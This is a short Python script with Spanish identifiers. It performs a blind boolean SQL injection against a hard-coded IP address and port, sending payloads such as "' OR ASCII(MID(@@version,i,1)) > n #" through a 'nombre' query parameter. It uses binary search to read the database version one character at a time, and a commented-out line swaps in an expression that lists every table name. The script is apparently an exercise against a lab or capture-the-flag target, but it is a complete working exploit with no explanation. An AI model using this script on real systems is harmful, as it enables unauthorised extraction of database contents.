import urllib.request
import urllib.parse
import string

ruta = "http://34.174.215.121:8001/country/restricted"
expresion = "@@version"#"(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)"

def oraculo(contenido):
    parametro = urllib.parse.urlencode({"nombre": contenido})
    url = f"{ruta}?{parametro}"

    with urllib.request.urlopen(url) as request:
        return request.read().decode() == "true"

length = 50

cadena = ""
for i in range(1, length + 1):
    lower_limit = 31
    upper_limit = 127

    while lower_limit < upper_limit:
        midpoint = (lower_limit + upper_limit) // 2

        payload = f"' OR ASCII(MID({expresion},{i},1)) > {midpoint} #"
        if oraculo(payload):
            lower_limit = midpoint + 1
        else:
            upper_limit = midpoint

        print("Probando caracter", chr(lower_limit))
        
    
    if lower_limit <= 32:
        break

    
    print("Encontramos el caracter", chr(lower_limit))
    cadena += chr(lower_limit)

print(f"La expresion {expresion} tiene el valor {cadena}")
